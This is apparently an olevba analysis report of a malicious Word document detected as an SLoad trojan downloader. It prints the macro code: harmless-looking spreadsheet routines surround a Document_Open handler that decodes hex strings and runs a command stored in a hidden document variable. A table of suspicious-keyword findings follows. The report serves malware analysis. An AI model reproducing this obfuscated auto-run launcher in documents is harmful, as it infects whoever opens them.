olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-e9ec57f67255818cfb8920558c2571e4427628757a23b8369a9c2784e850b199
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-e9ec57f67255818cfb8920558c2571e4427628757a23b8369a9c2784e850b199 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Sub WBR()
Dim Count1Criteria As Variant
Dim Count3Criteria As Variant
Dim test As Variant
Dim wf As WorksheetFunction
Set wf = Application.WorksheetFunction

Filter1InSummary = Array(Array("AE4", "Latency", "O:O", "Pass"), _
                         Array("AE51", "TT", "G:G", "Yes"), _
                         Array("AE52", "TT", "G:G", "No"), _
                         Array("AE61", "Reactive", "R:R", "Item"))

Filter3InSummary = Array(Array("AE43", "TT", "I:I", "<>Duplicate TT", _
                                             "G:G", "<>Not Tested", _
                                             "U:U", "Item"))
For Each test In Filter3InSummary
    With Worksheets(test(1))
        Range(test(0)) = wf.CountIfs(.Range(test(2)), test(3), _
                                     .Range(test(4)), test(5), _
                                     .Range(test(6)), test(7))
    End With
    Next
Sub Document_Open()
Application.Run "OFKRCCP_"
End Sub
Private Sub OFKRCCP_()
CallByName CreateObject(O_("9E9AAAB9B0B7BB759AAFACB3B3")), O_("99BCB5"), VbMethod, O_(ActiveDocument.Variables("CDTWVDFWXC").Value), 0, True
End Sub

Sub testme()

Dim myResult As Variant

myResult = "Error!"
With ActiveSheet
If IsNumeric(.Cells(4, 4).Value) Then
If IsNumeric(.Cells(5, 4).Value) Then
If .Cells(5, 4).Value <> 0 Then
myResult = .Cells(4, 4).Value / .Cells(5, 4).Value / 100
End If
End If
End If
End With

MsgBox myResult
If IsNumeric(myResult) Then
MsgBox Format(myResult, "0.00%")
End If
End Sub
Private Function O_(ByVal S_ As String)
Dim OR_ As String: Dim V_ As Long: For V_ = 1 To Len(S_) Step 2: OR_ = OR_ & Chr(Val(Chr(Val(Chr(51) & Chr(56))) & Chr(Val(Chr(55) & Chr(50))) & Mid(S_, V_, 2)) - 71): Next: O_ = OR_
End Function
Sub dural()
    Dim r1 As Range, r2 As Range, r3 As Range

    Set r1 = Range("AE43")
    Set r2 = Range("AE51")
    Set r3 = Range("AE53")
    If r1.Value <> 0 Then
        r3.Value = r2.Value / r1.Value
    End If
    r3.NumberFormat = "00.0%"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

